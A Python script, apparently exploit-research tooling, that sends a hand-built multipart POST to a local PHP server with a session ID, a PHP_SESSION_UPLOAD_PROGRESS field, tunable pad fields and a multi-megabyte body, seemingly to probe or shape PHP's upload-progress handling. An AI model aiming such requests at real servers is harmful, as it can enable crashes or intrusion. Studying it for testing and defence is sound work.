#!/usr/bin/env python3
"""Request A with pad fields inserted before the file part.

usage: send_a_pad.py BND SID PROG HUGE_MB [pad_spec ...]
pad_spec: NAME_LEN:VALUE_LEN  (name is 'p'*NAME_LEN, value 'V'*VALUE_LEN)
"""
import socket, sys
BNDLEN=int(sys.argv[1]); SIDLEN=int(sys.argv[2]); PROGLEN=int(sys.argv[3]); HUGE=int(sys.argv[4]) if len(sys.argv)>4 else 12
PADS=sys.argv[5:]
BND=b'S'*BNDLEN; SID=b'a'*SIDLEN
parts=[{'name':'PHPSESSID','data':SID},{'name':'PHP_SESSION_UPLOAD_PROGRESS','data':b'p'*PROGLEN}]
for i,spec in enumerate(PADS):
    nl,vl=spec.split(':'); nl=int(nl); vl=int(vl)
    parts.append({'name':('p%0*d'%(max(0,nl-1),i))[:nl] if nl>0 else '', 'data':b'V'*vl})
parts.append({'name':'f','filename':'a.txt','data':b'A'*64})
parts.append({'name':'big','data':b'B'*(HUGE*1024*1024)})
o=bytearray()
for p in parts:
    o+=b'--'+BND+b'\r\n'
    if 'filename' in p:
        o+=b'Content-Disposition: form-data; name="'+p['name'].encode()+b'"; filename="'+p['filename'].encode()+b'"\r\nContent-Type: application/octet-stream\r\n\r\n'
    else:
        o+=b'Content-Disposition: form-data; name="'+p['name'].encode()+b'"\r\n\r\n'
    o+=p['data']+b'\r\n'
o+=b'--'+BND+b'--\r\n'; body=bytes(o)
h=(f'POST /index.php HTTP/1.1\r\nHost: 127.0.0.1:8088\r\nContent-Type: multipart/form-data; boundary={BND.decode()}\r\nContent-Length: {len(body)}\r\nConnection: close\r\n\r\n').encode()
s=socket.create_connection(('127.0.0.1',8088),timeout=30); s.settimeout(30)
try: s.sendall(h+body)
except OSError: pass
try:
    while s.recv(65536): pass
except OSError: pass
s.close()
